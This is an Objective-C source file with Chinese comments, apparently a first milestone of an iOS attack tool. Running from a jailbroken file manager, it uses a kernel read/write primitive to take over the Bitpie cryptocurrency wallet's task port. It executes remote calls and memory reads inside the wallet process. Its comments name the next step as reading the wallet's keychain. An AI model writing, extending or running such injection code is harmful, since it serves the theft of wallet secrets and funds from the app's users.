// dsx_remote.m —— 里程碑 A：验证「远程调用」在本机可用
// 目的：从 Filza（内核逃逸进程）里，通过 DarkSword KRW 拿到目标 App（比特派）的 task port，
//       并在它进程内执行一次简单调用（getpid / getuid），把结果写文件。
// 若这一步成功 → 后面读它的钥匙串（SecItemCopyMatching）就是顺理成章的事。
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <mach/mach.h>
#import <unistd.h>
#import "TaskRop/RemoteCall.h"

#define DSX_OUT @"/var/mobile/Media/DSX/remote_test.txt"   // 手机上的输出位置（Filza 能读到）

static void dsxLog(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[DSX] %@", s);
    // 同时追加到输出文件，方便后面取回
    NSString *dir = [DSX_OUT stringByDeletingLastPathComponent];
    [[NSFileManager defaultManager] createDirectoryAtPath:dir withIntermediateDirectories:YES attributes:nil error:nil];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:DSX_OUT];
    if (!fh) { [[NSFileManager defaultManager] createFileAtPath:DSX_OUT contents:nil attributes:nil];
               fh = [NSFileHandle fileHandleForWritingAtPath:DSX_OUT]; }
    if (fh) { [fh seekToEndOfFile];
              [fh writeData:[[NSString stringWithFormat:@"%@\n", s] dataUsingEncoding:NSUTF8StringEncoding]];
              [fh closeFile]; }
}

void dsx_remote_probe(void) {
    @autoreleasepool {
        NSString *head = [NSString stringWithFormat:@"==== DSX remote probe %@ ====", [NSDate date]];
        dsxLog(@"%@", head);

        const char *targets[] = { "Bitpie", "bitpie", "BitpieWallet", NULL };
        for (int i = 0; targets[i]; i++) {
            dsxLog(@"尝试附加进程: %s", targets[i]);
            int r = init_remote_call(targets[i], true);
            dsxLog(@"init_remote_call(%s) -> %d", targets[i], r);
            if (r != 0) continue;

            // 在目标进程里调用 getpid()，再把返回值当字符串读回
            uint64_t pid = do_remote_call_stable(5, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
            dsxLog(@"远程 getpid() = 0x%llx (%llu)", pid, pid);
            uint64_t uid = do_remote_call_stable(5, "getuid", 0, 0, 0, 0, 0, 0, 0, 0);
            dsxLog(@"远程 getuid() = 0x%llx", uid);
            uint64_t euid = do_remote_call_stable(5, "geteuid", 0, 0, 0, 0, 0, 0, 0, 0);
            dsxLog(@"远程 geteuid() = 0x%llx", euid);

            // 试读目标进程的一段内存（它的 Mach-O 头，验证 remote_read 可用）
            uint64_t hdr[4] = {0};
            if (remote_read(0x100000000, hdr, sizeof(hdr))) {
                dsxLog(@"remote_read 成功: %016llx %016llx", hdr[0], hdr[1]);
            } else {
                dsxLog(@"remote_read 失败（正常，地址不一定可读）");
            }

            destroy_remote_call();
            dsxLog(@"已断开。里程碑 A 结束。");
            break;
        }
        if (!targets[0]) dsxLog(@"没有目标可试");
    }
}
